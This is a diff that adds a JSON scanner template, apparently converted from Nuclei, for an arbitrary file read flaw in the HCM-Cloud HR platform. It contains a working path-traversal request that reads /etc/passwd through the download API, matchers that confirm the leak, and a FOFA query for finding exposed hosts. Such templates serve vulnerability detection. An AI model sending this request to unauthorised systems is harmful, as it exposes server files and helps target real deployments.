@@ -1,0 +1,122 @@
+{
+  "id": "hcm-cloud-lfi",
+  "name": "HCM Cloud - Arbitrary File Read",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "HCM-Cloud professional human resources platform in the cloud download Arbitrary file read vulnerability.\n",
+  "references": [
+    "https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw",
+    "https://github.com/wy876/POC/blob/main/%E6%B5%AA%E6%BD%AE%E4%BA%91/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "hcm-cloud",
+    "lfi",
+    "hcm"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "icon_hash\u003d\"-859381597\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/api/model_report/file/download?index\u003d/\u0026ext\u003d/etc/passwd",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "regex(\u0027root:.*:0:0:\u0027, body)",
+            "contains(content_type, \"application/octet-stream\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "hcm-cloud-lfi",
+    "info": {
+      "name": "HCM Cloud - Arbitrary File Read",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "HCM-Cloud professional human resources platform in the cloud download Arbitrary file read vulnerability.\n",
+      "reference": [
+        "https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw",
+        "https://github.com/wy876/POC/blob/main/%E6%B5%AA%E6%BD%AE%E4%BA%91/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "icon_hash\u003d\"-859381597\""
+      },
+      "tags": "hcm-cloud,lfi,hcm"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/api/model_report/file/download?index\u003d/\u0026ext\u003d/etc/passwd"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "regex(\u0027root:.*:0:0:\u0027, body)",
+              "contains(content_type, \"application/octet-stream\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
